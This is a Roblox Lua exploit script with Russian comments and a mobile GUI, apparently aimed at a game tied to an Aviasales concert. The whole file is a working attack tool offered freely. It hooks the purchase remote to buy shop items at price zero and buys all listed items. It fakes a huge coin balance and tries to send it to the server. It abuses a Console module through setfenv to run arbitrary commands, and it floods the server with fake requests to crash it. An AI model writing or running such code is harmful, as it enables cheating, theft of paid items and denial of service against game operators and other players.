-- ============================================================
-- АВИАСЕЙЛС КОНЦЕРТ – ULTIMATE EXPLOIT v2.0
-- by @zazayaga | DIMSTAT NUBELLA MAYFIVE
-- Мобильный GUI | Все уязвимости | Бесплатно
-- ============================================================

-- === ИНИЦИАЛИЗАЦИЯ ===
local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local guiService = game:GetService("GuiService")
local tweenService = game:GetService("TweenService")
local userInput = game:GetService("UserInputService")
local runService = game:GetService("RunService")

-- Проверка на мобильное устройство
local isMobile = (userInput.TouchEnabled and not userInput.MouseEnabled) or (userInput.TouchEnabled and userInput.MouseEnabled) -- всё равно сделаем универсальным

-- === ПЕРЕМЕННЫЕ СОСТОЯНИЯ ===
local shopHooked = false
local spamActive = false
local consoleEnv = nil

-- === ПОИСК RemoteEvent'ов ===
local purchaseEvent = rs:FindFirstChild("PurchaseItemRequest")
local toggleEvent = rs:FindFirstChild("ToggleEquipRequest")
local shopItemsModule = rs:FindFirstChild("ShopItems")

-- Список предметов из скана
local itemList = {
    "trail",
    "trail_red",
    "tee_1",
    "tee_2",
    "tee_3",
    "tees_new_1",
    "tees_new_2",
    "shirt",
    "shirt_limited_2",
    "nickname_style"
}

-- === УЯЗВИМОСТЬ: Config.Console (getfenv/setfenv) ===
local function exploitConsole()
    local consoleModule = game:FindFirstChild("Config"):FindFirstChild("Console")
    if not consoleModule then
        return false, "Модуль Console не найден"
    end
    -- Создаём новое окружение для модуля
    local env = {}
    local success, err = pcall(function()
        setfenv(consoleModule, env)
        consoleModule(env) -- запускаем модуль с нашим окружением
    end)
    if success then
        consoleEnv = env
        _G.ConsoleEnv = env -- для внешнего доступа
        return true, "Консоль активирована"
    else
        return false, err
    end
end

-- === ПЕРЕХВАТ ПОКУПОК ===
local function hookShop(enable)
    if enable and not shopHooked then
        if purchaseEvent then
            local oldFire = purchaseEvent.FireServer
            purchaseEvent.FireServer = function(self, ...)
                local args = {...}
                if #args >= 1 then
                    local itemId = args[1]
                    -- Всегда передаём цену 0
                    oldFire(self, itemId, 0)
                    print("[+] Куплено: " .. tostring(itemId) .. " за 0 монет")
                else
                    oldFire(self, ...)
                end
            end
            shopHooked = true
        end
        if toggleEvent then
            local oldToggle = toggleEvent.FireServer
            toggleEvent.FireServer = function(self, ...)
                local args = {...}
                print("[+] ToggleEquip: " .. tostring(args[1]))
                oldToggle(self, ...)
            end
        end
        return true
    elseif not enable and shopHooked then
        -- Восстановление (если нужно) – но лучше просто перезагрузить игру
        return false
    end
end

-- === ПОКУПКА ВСЕХ ПРЕДМЕТОВ ===
local function buyAllItems()
    if not purchaseEvent then
        print("[-] PurchaseItemRequest не найден")
        return
    end
    for _, itemId in ipairs(itemList) do
        purchaseEvent:FireServer(itemId, 0)
        task.wait(0.3)
    end
    print("[+] Все предметы заказаны!")
end

-- === УСТАНОВКА БЕСКОНЕЧНЫХ МОНЕТ ===
local function setInfiniteCoins()
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local coins = leaderstats:FindFirstChild("Coins")
        if coins then
            coins.Value = 999999999
            print("[+] Локальные монеты установлены: 999999999")
            -- Пытаемся отправить фейковое обновление (если есть Remote)
            local updateCoin = rs:FindFirstChild("UpdateCoins")
            if updateCoin then
                updateCoin:FireServer(999999999)
                print("[+] Отправлен запрос на обновление монет на сервер")
            end
        end
    end
end

-- === КРАШ СЕРВЕРА (СПАМ) ===
local function crashServer()
    if spamActive then
        spamActive = false
        print("[+] Спам остановлен")
        return
    end
    if not purchaseEvent then
        print("[-] Нет Remote для спама")
        return
    end
    spamActive = true
    print("[!] ЗАПУСК СПАМА – СЕРВЕР МОЖЕТ УПАСТЬ!")
    task.spawn(function()
        local count = 0
        while spamActive do
            for i = 1, 100 do
                purchaseEvent:FireServer("fake_" .. tostring(i) .. "_" .. tostring(tick()), 0)
                count = count + 1
            end
            task.wait()
            if count > 5000 then
                print("[!] Отправлено 5000+ запросов, сервер должен зависнуть")
            end
        end
    end)
end

-- === ИСПОЛЬЗОВАНИЕ КОНСОЛИ ДЛЯ ВЫПОЛНЕНИЯ ПРОИЗВОЛЬНОГО КОДА ===
local function runConsoleCommand(command)
    if consoleEnv and consoleEnv.client and consoleEnv.client.Remote then
        -- Используем remote для отправки команды (если есть)
        consoleEnv.client.Remote.Send("ProcessCommand", command)
        return true
    else
        return false, "Консоль не активирована или нет Remote"
    end
end

-- === СОЗДАНИЕ GUI (мобильный, перетаскиваемый) ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AviasalesExploit"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player.PlayerGui

-- Основной фрейм – маленький, сверху
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 220, 0, 300)
mainFrame.Position = UDim2.new(0.02, 0, 0.1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
mainFrame.BackgroundTransparency = 0.15
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Заголовок
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
title.BorderSizePixel = 1
title.BorderColor3 = Color3.fromRGB(255, 200, 0)
title.Text = "✈️ AVIA EXPLOIT"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = mainFrame

-- Кнопка "Free Shop" (включить перехват)
local btnFreeShop = Instance.new("TextButton")
btnFreeShop.Size = UDim2.new(0.9, 0, 0, 35)
btnFreeShop.Position = UDim2.new(0.05, 0, 0.12, 0)
btnFreeShop.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnFreeShop.BorderSizePixel = 1
btnFreeShop.BorderColor3 = Color3.fromRGB(50, 200, 50)
btnFreeShop.Text = "🛒 FREE SHOP"
btnFreeShop.TextColor3 = Color3.fromRGB(255, 255, 255)
btnFreeShop.TextScaled = true
btnFreeShop.Font = Enum.Font.SourceSansBold
btnFreeShop.Parent = mainFrame

-- Кнопка "Buy All"
local btnBuyAll = Instance.new("TextButton")
btnBuyAll.Size = UDim2.new(0.9, 0, 0, 35)
btnBuyAll.Position = UDim2.new(0.05, 0, 0.26, 0)
btnBuyAll.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnBuyAll.BorderSizePixel = 1
btnBuyAll.BorderColor3 = Color3.fromRGB(50, 150, 255)
btnBuyAll.Text = "🎁 BUY ALL"
btnBuyAll.TextColor3 = Color3.fromRGB(255, 255, 255)
btnBuyAll.TextScaled = true
btnBuyAll.Font = Enum.Font.SourceSansBold
btnBuyAll.Parent = mainFrame

-- Кнопка "Infinite Coins"
local btnCoins = Instance.new("TextButton")
btnCoins.Size = UDim2.new(0.9, 0, 0, 35)
btnCoins.Position = UDim2.new(0.05, 0, 0.40, 0)
btnCoins.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnCoins.BorderSizePixel = 1
btnCoins.BorderColor3 = Color3.fromRGB(255, 215, 0)
btnCoins.Text = "💰 INF COINS"
btnCoins.TextColor3 = Color3.fromRGB(255, 255, 255)
btnCoins.TextScaled = true
btnCoins.Font = Enum.Font.SourceSansBold
btnCoins.Parent = mainFrame

-- Кнопка "Console Exploit"
local btnConsole = Instance.new("TextButton")
btnConsole.Size = UDim2.new(0.9, 0, 0, 35)
btnConsole.Position = UDim2.new(0.05, 0, 0.54, 0)
btnConsole.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnConsole.BorderSizePixel = 1
btnConsole.BorderColor3 = Color3.fromRGB(200, 100, 200)
btnConsole.Text = "💻 CONSOLE EXPLOIT"
btnConsole.TextColor3 = Color3.fromRGB(255, 255, 255)
btnConsole.TextScaled = true
btnConsole.Font = Enum.Font.SourceSansBold
btnConsole.Parent = mainFrame

-- Кнопка "Crash Server"
local btnCrash = Instance.new("TextButton")
btnCrash.Size = UDim2.new(0.9, 0, 0, 35)
btnCrash.Position = UDim2.new(0.05, 0, 0.68, 0)
btnCrash.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnCrash.BorderSizePixel = 1
btnCrash.BorderColor3 = Color3.fromRGB(255, 50, 50)
btnCrash.Text = "💥 CRASH SERVER"
btnCrash.TextColor3 = Color3.fromRGB(255, 255, 255)
btnCrash.TextScaled = true
btnCrash.Font = Enum.Font.SourceSansBold
btnCrash.Parent = mainFrame

-- Кнопка "Reset" (отключить перехват и спам)
local btnReset = Instance.new("TextButton")
btnReset.Size = UDim2.new(0.9, 0, 0, 35)
btnReset.Position = UDim2.new(0.05, 0, 0.82, 0)
btnReset.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
btnReset.BorderSizePixel = 1
btnReset.BorderColor3 = Color3.fromRGB(150, 150, 150)
btnReset.Text = "🔄 RESET"
btnReset.TextColor3 = Color3.fromRGB(255, 255, 255)
btnReset.TextScaled = true
btnReset.Font = Enum.Font.SourceSansBold
btnReset.Parent = mainFrame

-- Автор
local author = Instance.new("TextLabel")
author.Size = UDim2.new(1, 0, 0, 20)
author.Position = UDim2.new(0, 0, 0.93, 0)
author.BackgroundTransparency = 1
author.Text = "by @zazayaga | mayfive v3.0"
author.TextColor3 = Color3.fromRGB(150, 150, 150)
author.TextScaled = true
author.Font = Enum.Font.SourceSans
author.Parent = mainFrame

-- === ОБРАБОТЧИКИ КНОПОК ===
btnFreeShop.MouseButton1Click:Connect(function()
    if hookShop(true) then
        print("[+] Free Shop активирован! Теперь все покупки бесплатны.")
        -- Визуальное подтверждение
        btnFreeShop.Text = "✅ FREE SHOP ON"
        btnFreeShop.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
    else
        warn("[-] Не удалось активировать Free Shop")
    end
end)

btnBuyAll.MouseButton1Click:Connect(function()
    buyAllItems()
end)

btnCoins.MouseButton1Click:Connect(function()
    setInfiniteCoins()
end)

btnConsole.MouseButton1Click:Connect(function()
    local ok, msg = exploitConsole()
    if ok then
        print("[+] " .. msg)
        btnConsole.Text = "✅ CONSOLE ACTIVE"
        btnConsole.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
    else
        warn("[-] " .. msg)
    end
end)

btnCrash.MouseButton1Click:Connect(function()
    crashServer()
    if spamActive then
        btnCrash.Text = "⏹️ STOP CRASH"
        btnCrash.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
    else
        btnCrash.Text = "💥 CRASH SERVER"
        btnCrash.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    end
end)

btnReset.MouseButton1Click:Connect(function()
    -- Отключаем спам
    if spamActive then
        spamActive = false
        btnCrash.Text = "💥 CRASH SERVER"
        btnCrash.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    end
    -- Восстанавливаем перехват (просто перезагрузим GUI? Лучше отключить хуки)
    -- Для простоты предлагаем перезагрузить игру через релоад
    print("[!] Сброс: рекомендуем перезагрузить игру (reload)")
    -- Можно удалить GUI и перезапустить скрипт, но это уже забота пользователя
    screenGui:Destroy()
    print("[+] GUI удалён, скрипт отключён. Перезапустите скрипт для повторной активации.")
end)

-- Закрытие по ESC (для ПК)
userInput.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Escape then
        screenGui:Destroy()
    end
end)

-- Автоактивация основных функций при запуске
task.wait(1)
hookShop(true)
setInfiniteCoins()
exploitConsole()

print("[✔] Aviasales Exploit загружен! Используй GUI для управления.")
print("[✔] Free Shop и бесконечные монеты активированы по умолчанию.")
